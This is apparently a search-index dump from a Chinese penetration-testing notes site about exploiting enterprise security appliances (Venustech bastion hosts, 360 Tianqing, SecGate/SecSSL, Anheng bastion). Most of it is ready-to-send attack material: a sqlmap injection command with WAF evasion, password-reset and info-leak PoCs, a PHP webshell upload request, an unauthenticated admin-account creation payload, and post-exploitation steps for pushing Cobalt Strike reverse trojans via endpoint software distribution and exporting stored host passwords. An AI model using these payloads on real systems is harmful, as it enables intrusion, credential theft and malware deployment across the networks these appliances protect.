\u5929\u94a5\u7f51\u5173","title":"\u542f\u660e\u661f\u8fb0"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/#_1","text":"","title":"\u542f\u660e\u661f\u8fb0"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/#_2","text":"\u5929\u94a5\u5821\u5792\u673a \u524d\u53f0sql\u6ce8\u5165 \u7edf\u4e00\u5b89\u5168\u7ba1\u7406\u5e73\u53f0 \u542f\u660e\u661f\u8fb0-4A \u7edf\u4e00\u5b89\u5168\u7ba1\u63a7\u5e73\u53f0 getMater \u4fe1\u606f\u6cc4\u6f0f \u5929\u94a5\u7f51\u5173","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/#_3","text":"app=\"\u542f\u660e\u661f\u8fb0-\u5929\u73a5\u7f51\u7edc\u5b89\u5168\u5ba1\u8ba1\"","title":"\u5929\u94a5\u5821\u5792\u673a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/#sql","text":"POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1 Host: **** Connection: close Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Language: zh-CN,zh;q=0.9 Cookie: **** Content-Type: application/x-www-form-urlencoded Content-Length: 39 checkname=123&tagid=123 sqlmap -u \"https\\:///ops/index.php?c=Reportguide\\&a=checkrn\" --data \"checkname=123\\&tagid=123\" -v3 --skip-waf --random-agent","title":"\u524d\u53f0sql\u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/#_4","text":"","title":"\u7edf\u4e00\u5b89\u5168\u7ba1\u7406\u5e73\u53f0"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/#-4a-getmater","text":"\u6f0f\u6d1e\u63cf\u8ff0\uff1a \u542f\u660e\u661f\u8fb0\u96c6\u56e24A\u7edf\u4e00\u5b89\u5168\u7ba1\u63a7\u5e73\u53f0\u5b9e\u73b0IT\u8d44\u6e90\u96c6\u4e2d\u7ba1\u7406,\u4e3a\u4f01\u4e1a\u63d0\u4f9b\u96c6\u4e2d\u7684\u8d26\u53f7\u3001\u8ba4\u8bc1\u3001\u6388\u6743\u3001\u5ba1\u8ba1\u7ba1\u7406\u6280\u672f\u652f\u6491\u53ca\u914d\u5957\u6d41\u7a0b,\u63d0\u5347\u7cfb\u7edf\u5b89\u5168\u6027\u548c\u53ef\u7ba1\u7406\u80fd\u529b\u3002\u53ef\u83b7\u53d6\u76f8\u5173\u4eba\u5458\u654f\u611f\u4fe1\u606f\u3002 poc: relative: req0 session: false requests: - method: GET timeout: 10 path: /accountApi/getMaster.do headers: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.881.36 Safari/537.36 follow_redirects: true matches: (code.eq(\"200\") && body.contains(\"\\\"state\\\":true\")) \u4fee\u590d\u5efa\u8bae\uff1a \u9650\u5236\u6587\u4ef6\u8bbf\u95ee","title":"\u542f\u660e\u661f\u8fb0-4A \u7edf\u4e00\u5b89\u5168\u7ba1\u63a7\u5e73\u53f0 getMater \u4fe1\u606f\u6cc4\u6f0f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/#_5","text":"","title":"\u5929\u94a5\u7f51\u5173"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/","text":"\u5947\u5b89\u4fe1&360 \u76ee\u5f55 \u5929\u64ce \u6f0f\u6d1e\u5e93 360 \u65b0\u5929\u64ce\u7ec8\u7aef\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e \u540e\u6e17\u900f \u5929\u64ce\u63a7\u5236\u5ba2\u6237\u673a \u7f51\u795e hunter \u7f51\u795e SecSSL 3600\u5b89\u5168\u63a5\u5165\u7f51\u5173\u7cfb\u7edf \u4efb\u610f\u5bc6\u7801\u4fee\u6539\u6f0f\u6d1e \u7f51\u795e SecGate 3600 \u9632\u706b\u5899 obj_app_upfile \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u7f51\u795e SecSSL 3600\u5b89\u5168\u63a5\u5165\u7f51\u5173\u7cfb\u7edf \u4efb\u610f\u5bc6\u7801\u4fee\u6539\u6f0f\u6d1e \u5929\u64ce \u7ec8\u7aef\u5b89\u5168\u7ba1\u7406\uff0c\u53ef\u4ee5\u540c\u65f6\u7ba1\u7406\u591a\u53f0\u4e3b\u673a \u6f0f\u6d1e\u5e93 360 \u65b0\u5929\u64ce\u7ec8\u7aef\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e http://ip:port/runtime/admin_log_conf.cache \u540e\u6e17\u900f \u5929\u64ce\u63a7\u5236\u5ba2\u6237\u673a 1.\u81ea\u5e26\u7684\u8fdc\u7a0b\u684c\u9762\u63a7\u5236\uff0c\u4f46\u662f\u8fd9\u4e2a\u529f\u80fd\u53ef\u80fd\u88ab\u7ba1\u7406\u5458\u9690\u85cf\u4e86\u627e\u4e0d\u5230\uff0c\u5373\u4f7f\u80fd\u7528\u8fd9\u4e2a\u529f\u80fd\uff0c\u4e5f\u53ef\u80fd\u51fa\u73b0\u56e0\u4e3a\u4e0d\u77e5\u9053\u673a\u5668\u5bc6\u7801\uff0c\u505c\u7559\u5728\u9501\u5c4f\u3002 2.\u4f7f\u7528\u8f6f\u4ef6\u5206\u53d1\u529f\u80fd\u4f20\u9a6c \u5982\u679c\u673a\u5668\u51fa\u7f51\uff0c\u76f4\u63a5\u4e0acs\u53cd\u5f39\u9a6c\u3002 \u5982\u679c\u673a\u5668\u4e0d\u51fa\u7f51\uff0c\u4f46\u662f\u5f00\u4e863389 \u3001445\u3001135\u7b49\u7aef\u53e3\u3002\u6211\u4eec\u53ef\u4ee5\u4f20\u6dfb\u52a0\u7528\u6237\u7684exe\u8fc7\u53bb\uff0c\u518d\u767b\u5f55445\u6216\u52193389\u3002 \u5982\u679c\u673a\u5668\u4e0d\u51fa\u7f51\uff0c\u4e14\u6ca1\u6709\u5f00\u53d1\u4efb\u4f55\u7aef\u53e3\uff0c\u4f8b\u5982pc\u529e\u516c\u673a\u5668\uff08\u5929\u64ce\u5ba2\u6237\u673a\u5f88\u591a\u8fd9\u79cd\u60c5\u51b5\uff09\u3002 \u53ef\u505a\u6b63\u5411\u6216\u8005\u53cd\u5411\u9a6c\u8fde\u63a5 \u7ec8\u7aef\u7ba1\u7406-\u8f6f\u4ef6\u7ba1\u7406-\u8f6f\u4ef6\u5206\u53d1\uff0c\u4e0a\u4f20exe\uff0c\u7136\u540e\u5206\u53d1\u5373\u53ef\u3002 \u5206\u53d1\u6ce8\u610f\u5173\u95ed\u63d0\u793a\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u542f\u52a8\u53c2\u6570 \u7f51\u795e hunter \u7f51\u795esecgate app.name=\"\u7f51\u795e SecGate\" \u7f51\u795e SecSSL 3600\u5b89\u5168\u63a5\u5165\u7f51\u5173\u7cfb\u7edf \u4efb\u610f\u5bc6\u7801\u4fee\u6539\u6f0f\u6d1e POC POST /changepass.php?type=2 Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={\"this_name\":\"test\",\"subAuthId\":\"1\"} old_pass=&password=Test123!@&repassword=Test123!@ \u7f51\u795e SecGate 3600 \u9632\u706b\u5899 obj_app_upfile \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POST /?g=obj_app_upfile HTTP/1.1 Host: x.x.x.x Accept: */* Accept-Encoding: gzip, deflate Content-Length: 574 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0) ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"MAX_FILE_SIZE\" 10000000 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"upfile\"; filename=\"vulntest.php\" Content-Type: text/plain <?php php\u9a6c?> ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"submit_post\" obj_app_upfile ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"**hash**\" 0b9d6b1ab7479ab69d9f71b05e0e9445 ------WebKitFormBoundaryJpMyThWnAxbcBBQc-- \u9a6c\u513f\u8def\u5f84\uff1aattachements/xxx.php \u7f51\u795e SecSSL 3600\u5b89\u5168\u63a5\u5165\u7f51\u5173\u7cfb\u7edf \u4efb\u610f\u5bc6\u7801\u4fee\u6539\u6f0f\u6d1e POST /changepass.php?type=2 Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={\"this_name\":\"test\",\"subAuthId\":\"1\"} old_pass=&password=Test123!@&repassword=Test123!@","title":"\u5947\u5b89\u4fe1&360"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/#360","text":"","title":"\u5947\u5b89\u4fe1&amp;360"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/#_1","text":"\u5929\u64ce \u6f0f\u6d1e\u5e93 360 \u65b0\u5929\u64ce\u7ec8\u7aef\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e \u540e\u6e17\u900f \u5929\u64ce\u63a7\u5236\u5ba2\u6237\u673a \u7f51\u795e hunter \u7f51\u795e SecSSL 3600\u5b89\u5168\u63a5\u5165\u7f51\u5173\u7cfb\u7edf \u4efb\u610f\u5bc6\u7801\u4fee\u6539\u6f0f\u6d1e \u7f51\u795e SecGate 3600 \u9632\u706b\u5899 obj_app_upfile \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u7f51\u795e SecSSL 3600\u5b89\u5168\u63a5\u5165\u7f51\u5173\u7cfb\u7edf \u4efb\u610f\u5bc6\u7801\u4fee\u6539\u6f0f\u6d1e","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/#_2","text":"\u7ec8\u7aef\u5b89\u5168\u7ba1\u7406\uff0c\u53ef\u4ee5\u540c\u65f6\u7ba1\u7406\u591a\u53f0\u4e3b\u673a","title":"\u5929\u64ce"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/#_3","text":"","title":"\u6f0f\u6d1e\u5e93"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/#360_1","text":"http://ip:port/runtime/admin_log_conf.cache","title":"360 \u65b0\u5929\u64ce\u7ec8\u7aef\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/#_4","text":"","title":"\u540e\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/#_5","text":"1.\u81ea\u5e26\u7684\u8fdc\u7a0b\u684c\u9762\u63a7\u5236\uff0c\u4f46\u662f\u8fd9\u4e2a\u529f\u80fd\u53ef\u80fd\u88ab\u7ba1\u7406\u5458\u9690\u85cf\u4e86\u627e\u4e0d\u5230\uff0c\u5373\u4f7f\u80fd\u7528\u8fd9\u4e2a\u529f\u80fd\uff0c\u4e5f\u53ef\u80fd\u51fa\u73b0\u56e0\u4e3a\u4e0d\u77e5\u9053\u673a\u5668\u5bc6\u7801\uff0c\u505c\u7559\u5728\u9501\u5c4f\u3002 2.\u4f7f\u7528\u8f6f\u4ef6\u5206\u53d1\u529f\u80fd\u4f20\u9a6c \u5982\u679c\u673a\u5668\u51fa\u7f51\uff0c\u76f4\u63a5\u4e0acs\u53cd\u5f39\u9a6c\u3002 \u5982\u679c\u673a\u5668\u4e0d\u51fa\u7f51\uff0c\u4f46\u662f\u5f00\u4e863389 \u3001445\u3001135\u7b49\u7aef\u53e3\u3002\u6211\u4eec\u53ef\u4ee5\u4f20\u6dfb\u52a0\u7528\u6237\u7684exe\u8fc7\u53bb\uff0c\u518d\u767b\u5f55445\u6216\u52193389\u3002 \u5982\u679c\u673a\u5668\u4e0d\u51fa\u7f51\uff0c\u4e14\u6ca1\u6709\u5f00\u53d1\u4efb\u4f55\u7aef\u53e3\uff0c\u4f8b\u5982pc\u529e\u516c\u673a\u5668\uff08\u5929\u64ce\u5ba2\u6237\u673a\u5f88\u591a\u8fd9\u79cd\u60c5\u51b5\uff09\u3002 \u53ef\u505a\u6b63\u5411\u6216\u8005\u53cd\u5411\u9a6c\u8fde\u63a5 \u7ec8\u7aef\u7ba1\u7406-\u8f6f\u4ef6\u7ba1\u7406-\u8f6f\u4ef6\u5206\u53d1\uff0c\u4e0a\u4f20exe\uff0c\u7136\u540e\u5206\u53d1\u5373\u53ef\u3002 \u5206\u53d1\u6ce8\u610f\u5173\u95ed\u63d0\u793a\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u542f\u52a8\u53c2\u6570","title":"\u5929\u64ce\u63a7\u5236\u5ba2\u6237\u673a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/#_6","text":"","title":"\u7f51\u795e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/#hunter","text":"\u7f51\u795esecgate app.name=\"\u7f51\u795e SecGate\"","title":"hunter"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/#secssl-3600","text":"POC POST /changepass.php?type=2 Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={\"this_name\":\"test\",\"subAuthId\":\"1\"} old_pass=&password=Test123!@&repassword=Test123!@","title":"\u7f51\u795e SecSSL 3600\u5b89\u5168\u63a5\u5165\u7f51\u5173\u7cfb\u7edf \u4efb\u610f\u5bc6\u7801\u4fee\u6539\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/#secgate-3600-obj_app_upfile","text":"POST /?g=obj_app_upfile HTTP/1.1 Host: x.x.x.x Accept: */* Accept-Encoding: gzip, deflate Content-Length: 574 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0) ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"MAX_FILE_SIZE\" 10000000 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"upfile\"; filename=\"vulntest.php\" Content-Type: text/plain <?php php\u9a6c?> ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"submit_post\" obj_app_upfile ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"**hash**\" 0b9d6b1ab7479ab69d9f71b05e0e9445 ------WebKitFormBoundaryJpMyThWnAxbcBBQc-- \u9a6c\u513f\u8def\u5f84\uff1aattachements/xxx.php","title":"\u7f51\u795e SecGate 3600 \u9632\u706b\u5899 obj_app_upfile \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/%E5%A5%87%E5%AE%89%E4%BF%A1%26360/#secssl-3600_1","text":"POST /changepass.php?type=2 Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={\"this_name\":\"test\",\"subAuthId\":\"1\"} old_pass=&password=Test123!@&repassword=Test123!@","title":"\u7f51\u795e SecSSL 3600\u5b89\u5168\u63a5\u5165\u7f51\u5173\u7cfb\u7edf \u4efb\u610f\u5bc6\u7801\u4fee\u6539\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92/","text":"\u5b89\u6052 \u76ee\u5f55 \u5821\u5792\u673a \u540e\u6e17\u900f \u767b\u5f55\u8fdc\u7a0b\u684c\u9762 \u5bfc\u51fa\u5bc6\u7801 \u6f0f\u6d1e \u5b89\u6052\u660e\u5fa1\u8fd0\u7ef4\u5ba1\u8ba1\u4e0e\u98ce\u9669\u63a7\u5236\u7cfb\u7edf\u5821\u5792\u673a\u4efb\u610f\u7528\u6237\u6ce8\u518c \u5821\u5792\u673a \u540e\u6e17\u900f \u767b\u5f55\u8fdc\u7a0b\u684c\u9762 \u8fd0\u7ef4\u2192\u4e3b\u673a\u8fd0\u7ef4\u3002 \u53ef\u4ee5\u770b\u5230\u5f88\u591a\u673a\u5668\uff0c\u5982\u679c\u6ca1\u6709\u673a\u5668\u53ef\u4ee5\u70b9\u51fb\u8fdb\u884c\u6388\u6743\u6dfb\u52a0\u673a\u5668\u2192\u53f3\u4e0a\u89d2\u627e\u5230\u65b0\u5efa\u8fd0\u7ef4\u89c4\u5219 \u7136\u540e\u6dfb\u52a0\u7528\u6237\u9009\u5f53\u524d\u7528\u6237\uff0c\u6dfb\u52a0\u8d44\u4ea7\u628a\u80fd\u9009\u7684\u5168\u9009\u4e86\uff0c\u7136\u540e\u521b\u5efa\u8fd0\u7ef4\u89c4\u5219 \u7136\u540e\u56de\u5230\u4e3b\u673a\u8fd0\u7ef4 \u70b9\u51fb\u53f3\u8fb9\u7684\u5730\u7403\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u684c\u9762\u4e86 \u5bfc\u51fa\u5bc6\u7801 \u8d44\u4ea7\u2192\u4e3b\u673a\u7ba1\u7406\u2192\u6700\u4e0b\u9762\uff1a\u5bfc\u51fa\u4e3b\u673a,\u91cc\u9762\u5c31\u4f1a\u6709\u5f88\u591a\u5bc6\u7801\u4fe1\u606f \u6f0f\u6d1e \u5b89\u6052\u660e\u5fa1\u8fd0\u7ef4\u5ba1\u8ba1\u4e0e\u98ce\u9669\u63a7\u5236\u7cfb\u7edf\u5821\u5792\u673a\u4efb\u610f\u7528\u6237\u6ce8\u518c POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1 Host: xxx Cookie: LANG=zh; USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"Windows\" Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 1121 <?xml version=\"1.0\"?> <methodCall> <methodName>web.user_add</methodName> <params> <param> <value> <array> <data> <value> <string>admin</string> </value> <value> <string>5</string> </value> <value> <string>XX.XX.XX.XX</string> </value> </data> </array> </value> </param> <param> <value> <struct> <member> <name>uname</name> <value> <string>deptadmin</string> </value> </member> <member> <name>name</name> <value> <string>deptadmin</string> </value> </member> <member> <name>pwd</name> <value> <string>Deptadmin@123</string> </value> </member> <member> <name>authmode</name> <value> <string>1</string> </value> </member> <member> <name>deptid</name> <value> <string></string> </value> </member> <member> <name>email</name> <value> <string></string> </value> </member> <member> <name>mobile</name> <value> <string></string> </value> </member> <member> <name>comment</name> <value> <string></string> </value> </member> <member> <name>roleid</name> <value> <string>101</string> </value> </member> </struct></value> </param> </params> </methodCall>","title":"\u5b89\u6052"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92/#_1","text":"","title":"\u5b89\u6052"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92/#_2","text":"\u5821\u5792\u673a \u540e\u6e17\u900f \u767b\u5f55\u8fdc\u7a0b\u684c\u9762 \u5bfc\u51fa\u5bc6\u7801 \u6f0f\u6d1e \u5b89\u6052\u660e\u5fa1\u8fd0\u7ef4\u5ba1\u8ba1\u4e0e\u98ce\u9669\u63a7\u5236\u7cfb\u7edf\u5821\u5792\u673a\u4efb\u610f\u7528\u6237\u6ce8\u518c","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92/#_3","text":"","title":"\u5821\u5792\u673a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92/#_4","text":"","title":"\u540e\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92/#_5","text":"\u8fd0\u7ef4\u2192\u4e3b\u673a\u8fd0\u7ef4\u3002 \u53ef\u4ee5\u770b\u5230\u5f88\u591a\u673a\u5668\uff0c\u5982\u679c\u6ca1\u6709\u673a\u5668\u53ef\u4ee5\u70b9\u51fb\u8fdb\u884c\u6388\u6743\u6dfb\u52a0\u673a\u5668\u2192\u53f3\u4e0a\u89d2\u627e\u5230\u65b0\u5efa\u8fd0\u7ef4\u89c4\u5219 \u7136\u540e\u6dfb\u52a0\u7528\u6237\u9009\u5f53\u524d\u7528\u6237\uff0c\u6dfb\u52a0\u8d44\u4ea7\u628a\u80fd\u9009\u7684\u5168\u9009\u4e86\uff0c\u7136\u540e\u521b\u5efa\u8fd0\u7ef4\u89c4\u5219 \u7136\u540e\u56de\u5230\u4e3b\u673a\u8fd0\u7ef4 